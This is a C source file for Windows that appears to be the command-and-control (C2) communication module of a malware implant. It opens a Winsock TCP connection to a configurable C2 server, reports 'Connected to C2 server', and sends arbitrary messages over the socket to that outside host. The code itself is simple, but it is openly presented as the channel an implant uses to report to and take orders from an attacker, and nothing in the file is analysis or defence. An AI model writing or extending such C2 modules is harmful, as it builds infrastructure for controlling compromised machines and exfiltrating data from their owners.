#include "c2_communication_fixed.h"
#include "config.h"
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

SOCKET c2_socket = INVALID_SOCKET;

int InitC2Communication(const char* server, int port) {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed\n");
		return 0;
	}

	c2_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (c2_socket == INVALID_SOCKET) {
		printf("socket failed\n");
		WSACleanup();
		return 0;
	}

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(server);

	if (connect(c2_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
		printf("connect failed\n");
		closesocket(c2_socket);
		WSACleanup();
		return 0;
	}

	printf("Connected to C2 server\n");
	return 1;
}

void SendC2Message(const char* message) {
	if (c2_socket != INVALID_SOCKET) {
		send(c2_socket, message, strlen(message), 0);
	}
}

void CleanupC2Communication() {
	if (c2_socket != INVALID_SOCKET) {
		closesocket(c2_socket);
	}
	WSACleanup();
}